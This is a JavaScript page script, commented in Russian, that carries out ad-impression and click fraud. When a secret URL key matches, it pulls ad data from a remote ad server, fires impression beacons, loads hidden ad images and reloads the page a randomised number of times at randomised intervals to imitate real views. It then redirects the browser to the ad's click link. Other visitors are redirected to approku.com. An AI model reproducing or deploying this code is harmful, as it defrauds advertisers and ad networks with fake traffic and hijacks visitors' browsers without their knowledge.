window.onload = () => {
    (async function main(urlB='https://approku.com', key="123", refresh_time_arr=[ 532, 2000 ]) {
        // Функция для получения рандомного числа между двумя числами
        function getRandomBetween(min, max) {
            min = Math.ceil(min);
            max = Math.floor(max);
            return Math.floor(Math.random() * (max - min + 1)) + min; //Максимум и минимум включаются
        }
        async function ad(text="aeyJwaWQiOjEwMjMzOTMsInNpZCI6MTExNDAxMiwid2lkIjoyNjQ0MjEsImQiOiJhcHByb2t1LmNvbSIsImxpIjoyfQ==", count_arr=[ 17, 29 ]) {
            // Функция с промисом для ожидания перед следующим запросом 
            function delay(refresh_time) {
                return new Promise(resolve => setTimeout(resolve, refresh_time));
            }
            try {
                const url = `https://yfetyg.com/wnload?a=1&e=${text}&tz=8&if=0 `;
    
                const response = await fetch(url);
                const json = await response.json();
    
                // Генерируем рандомное число показов из диапазона
                let count = localStorage.getItem('COUNT');
                let attempt = localStorage.getItem('ATTEMPT');
                if (!count) {
                    count = getRandomBetween(count_arr[0], count_arr[1]);
                    localStorage.setItem('COUNT', count);
                    attempt = 0
                } else {
                    count = Number(count);
                    attempt = Number(attempt);
                }
    
                // Будущая ссылка для клика
                let click_url = '';
                for (let row of json) {

                    // Получаем ссылку для клика
                    if ('ads' in row) {
                        let new_url = row['ads'][0]['uf'];
                        click_url = new_url
                    }

                    if (count > attempt) {
                        // Запрос показа
                        if('rinfo' in row) {
                            if ('rw' in row['rinfo']) {
                                let part_url = row['rinfo']['rw'];
                                if (part_url) {
                                    // Без доп. параметра a=1 не работает
                                    let url = `https://yfetyg.com` + part_url + "&a=1";
                                    try {
                                        await fetch(url);
                                    } catch(e) {
                                        console.log(e);
                                    }
                                }
                            }
                        }
    
                        // Запрос показа картинки
                        if ('ads' in row) {
                            // Добавляем картинку, к запросу картинки добавляем рандомную переменную, чтобы не кэшировалась картинка и запрос заново делался
                            let icon_url = row['ads'][0]['ic'] + '?r=' + new Date().getTime();
                            let icon = document.createElement("img");
                            icon.style.visibility = 'hidden';
                            icon.src = icon_url
                            document.body.appendChild(icon);
                        }

                        // Определяем рандомное числи ms через которое будет рефреш из диапазона
                        const refresh_time = getRandomBetween(refresh_time_arr[0], refresh_time_arr[1]);

                        // Делаем остановку на сколько то милисикунд
                        await delay(refresh_time);

                        // Прибавляем показ и перезаписываем его в памяти браузера, потом перезагружаем страницу
                        attempt += 1;
                        localStorage.setItem('ATTEMPT', attempt);
                        window.location.reload();
                    } else {
                        // Очищаем все сохраненные переменные
                        localStorage.clear();
                    }

                }
    
                if (click_url) {
                    window.location.href = click_url;
                }
    
            } catch(e) {
                throw e;
            }
        };

        try {

            // Получаем GET параметры страницы и разбираем их в массив
            let getParams = decodeURIComponent(String(window.location.search).substring(1)).split('&');

            // Ищем совпадение по ключу. Если находим, то запускаем рекламную функцию
            for (let param of getParams) {
                let val = param.split('=')[1];
                if (val == key) {
                    await ad();
                    return;
                }
            }

            // Ничего не нашли, значит переходит по URL_B
            window.location.href = urlB;
            

        } catch(e) {
            alert('Произошла ошибка\nПодробнее в консоли разработчика');
            console.log(e);
        }

    })();

}
